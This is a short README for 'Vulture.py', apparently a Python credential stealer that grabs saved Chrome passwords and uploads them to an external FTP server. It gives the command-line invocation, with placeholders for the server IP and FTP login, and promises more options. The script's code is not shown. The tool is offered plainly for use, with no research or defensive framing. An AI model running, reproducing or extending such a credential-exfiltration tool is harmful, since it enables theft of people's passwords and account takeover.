# Vulture.py
Vulture.py, used to grab and upload Chrome passwords to an external FTP server.

To use Vulture, you'll need to run it from the command line, using the command: `python3 vulture.py -s <SERVER IP> -u <FTP USERNAME> -p <FTP PASSWORD>` It'll just grab the passwords for now, but more options _will_ be added shortly.
